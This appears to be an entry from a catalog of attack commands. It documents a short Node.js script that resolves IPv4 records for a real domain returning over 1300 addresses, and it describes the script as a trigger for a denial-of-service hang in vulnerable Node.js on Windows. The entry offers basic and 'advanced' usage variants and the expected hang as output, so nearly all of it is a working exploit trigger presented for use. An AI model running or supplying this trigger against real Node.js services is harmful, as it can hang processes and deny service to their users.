---
id: cmd-node-dns-resolve4-1033107
data: >-
  var dns = require('dns'); dns.resolve4('ticbrasil.com.br', function (err,
  addresses, family) { console.log(err); console.log(addresses);
  console.log(family); });
tags:
  - dos
  - dns
type: command
output: 'No output or hang due to vulnerability; expected: list of IPv4 addresses'
executor: node
platforms:
  - Node.js
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:30.823Z'
verified: false
validated: true
submitted: true
---
# node-dns-resolve4-ticbrasil

## Command

```javascript
var dns = require('dns');
dns.resolve4('ticbrasil.com.br', function (err, addresses, family) {
  console.log(err);
  console.log(addresses);
  console.log(family);
});
```

## Description

This Node.js command resolves IPv4 A records for the domain 'ticbrasil.com.br' using the built-in DNS module. It is used to trigger a DoS vulnerability by exploiting excessive resource consumption from over 1300 responses, causing the process to hang.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| domain | The domain to resolve (e.g., 'ticbrasil.com.br') | Yes |
| callback | Function handling error, addresses array, and family (4 or 6) | Yes |

## Examples

### Basic Usage

Save as script.js and run `node script.js`:

```javascript
var dns = require('dns');
dns.resolve4('ticbrasil.com.br', function (err, addresses, family) {
  console.log(err);
  console.log(addresses);
  console.log(family);
});
```

### Advanced Usage

Add error handling for production testing:

```javascript
var dns = require('dns');
dns.resolve4('ticbrasil.com.br', function (err, addresses, family) {
  if (err) {
    console.error('Error:', err);
  } else {
    console.log('Addresses:', addresses.length);
    console.log('Family:', family);
  }
});
```

## Expected Output

Due to the vulnerability, the command hangs or produces no output. In a non-vulnerable scenario, it logs null error, an array of 1300+ IPv4 addresses, and family 4. Reference full list: https://pastebin.com/Tv53Na89.

## Related

- [[Related Procedure|procedures/Trigger-Node.js-DNS-DoS-with-Large-Response-Domain]]
